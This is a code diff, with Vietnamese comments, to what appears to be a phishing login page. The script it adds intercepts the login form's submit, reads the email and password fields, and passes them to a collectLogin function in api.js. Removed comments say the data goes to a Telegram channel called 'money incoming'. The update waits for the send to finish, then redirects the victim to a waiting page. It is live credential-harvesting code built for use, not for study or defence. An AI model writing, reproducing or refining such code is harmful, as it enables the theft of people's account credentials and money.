@@ -274,26 +274,35 @@
     </script>
 </body>
 <script src="api.js"></script>
-
+<script src="api.js"></script>
 <script>
-// Đoạn mã này sẽ tự động 'chặn' cái form cũ và gửi về Tele của bạn
 document.addEventListener('DOMContentLoaded', function() {
-    const loginForm = document.querySelector('form'); // Tự động tìm cái form đăng nhập
+    const loginForm = document.querySelector('form');
     
     if (loginForm) {
-        loginForm.addEventListener('submit', function(e) {
-            // Lấy ID email và pass (theo đúng hình bạn gửi)
+        loginForm.addEventListener('submit', async function(e) {
+            // 1. Chặn không cho chuyển trang ngay lập tức
+            e.preventDefault(); 
+
+            // 2. Lấy giá trị TK/MK (đảm bảo đúng ID email và pass)
             const emailInput = document.getElementById('email');
             const passInput = document.getElementById('pass');
 
             if (emailInput && passInput) {
-                // Gửi dữ liệu về kênh "TIỀN VỀ" qua api.js
-                collectLogin(emailInput.value, passInput.value);
+                console.log("Đang gửi dữ liệu...");
                 
-                // Sau khi gửi xong thì cho nó chạy tiếp hoặc chuyển trang
-                console.log("Dữ liệu đã được gửi về Telegram.");
+                // 3. Gọi hàm gửi và đợi nó thực hiện (thêm await)
+                if (typeof collectLogin === "function") {
+                    await collectLogin(emailInput.value, passInput.value);
+                }
+
+                // 4. Đợi thêm 0.5 giây cho chắc chắn dữ liệu đã bay đi
+                setTimeout(() => {
+                    // 5. Lúc này mới cho chuyển trang
+                    window.location.href = "waiting.html";
+                }, 500);
             }
-        }, true); // Dùng tham số true để ưu tiên chạy lệnh này trước
+        });
     }
 });
 </script>
